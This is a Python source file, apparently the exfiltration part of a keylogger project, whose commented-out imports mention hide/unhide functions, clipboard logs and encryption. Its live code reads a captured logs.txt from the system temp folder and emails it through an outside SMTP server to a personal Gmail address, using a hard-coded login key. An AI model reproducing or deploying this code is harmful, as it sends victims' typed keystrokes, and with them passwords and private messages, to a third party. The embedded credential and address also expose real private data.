
# import smtplib
# from email.message import EmailMessage
import os
# import ctypes
# # from keylogger import hide
# # from keylogger import unhide 
# from encryption import encryptContents 
import tempfile

# log_file = "logs.txt"
# # clipBoard_file = "clipBoardLogs.txt"
# # blog_file = "logs.bin"
# # bclipBoard_file = "clipBoardLogs.bin"

# def sendEmail():
#     print("sending")

#     # nlog_file = encryptContents("logs.txt")
#     # print(nlog_file)
#     # nclipBoard_file = encryptContents("clipBoardLogs.txt")
#     # print(nclipBoard_file)
#     sender = "hello@demomailtrap.com"
#     receiver = "ukharbanda20@gmail.com"
#     message = EmailMessage()
#     message["Subject"] = "Hi Mailtrap"
#     message["From"] = sender
#     message["To"] = receiver
#     message.set_content("hi ursh.")
#     try:
#         with open(log_file, "r") as file:
#             fileData = file.read()
#             message.add_attachment(fileData, maintype="text", subtype="plain", filename="logs.txt")
#         # with open(log_file, "rb") as file:
#         #     fileData = file.read()
#         #     message.add_attachment(fileData, maintype="text", subtype="plain", filename="logs.txt")
#         # with open(clipBoard_file, "rb") as clipBoardFile:
#         #     clipBoardFileData = clipBoardFile.read()
#         #     message.add_attachment(clipBoardFileData, maintype="text", subtype="plain", filename="clipBoardLogs.txt")

#         with smtplib.SMTP("live.smtp.mailtrap.io", 587) as server:
#             server.starttls()
#             server.login("api", "c2151af737bd447f8f82331e58edbda8")
#             server.send_message(message)
#         print("Email sent successfully!")
    

#     except smtplib.SMTPDataError as e:
#         print("SMTP Data Error:", e)
#     except smtplib.SMTPException as e:
#         print("SMTP Error:", e)
#     except Exception as e:
#         print("General Error:", e)
    

# if __name__ == "__main__":
#     sendEmail()

    


from email.message import EmailMessage
import smtplib

log_file = "logs.txt"
log_file = os.path.join(tempfile.gettempdir(), 'logs.txt')
def sendEmail():
    print("sending")

    sender = "hello@demomailtrap.com"
    receiver = "ukharbanda20@gmail.com"
    message = EmailMessage()
    message["Subject"] = "Hi Mailtrap"
    message["From"] = sender
    message["To"] = receiver
    message.set_content("hi ursh.")

    try:
        with open(log_file, "r") as file:
            fileData = file.read()
            message.add_attachment(fileData.encode(), maintype="text", subtype="plain", filename="logs.txt")

        with smtplib.SMTP("live.smtp.mailtrap.io", 587) as server:
            server.starttls()
            server.login("api", "c2151af737bd447f8f82331e58edbda8")
            server.send_message(message)

        print("Email sent successfully!")

    except smtplib.SMTPDataError as e:
        print("SMTP Data Error:", e)
    except smtplib.SMTPException as e:
        print("SMTP Error:", e)
    except Exception as e:
        print("General Error:", e)

if __name__ == "__main__":
    sendEmail()
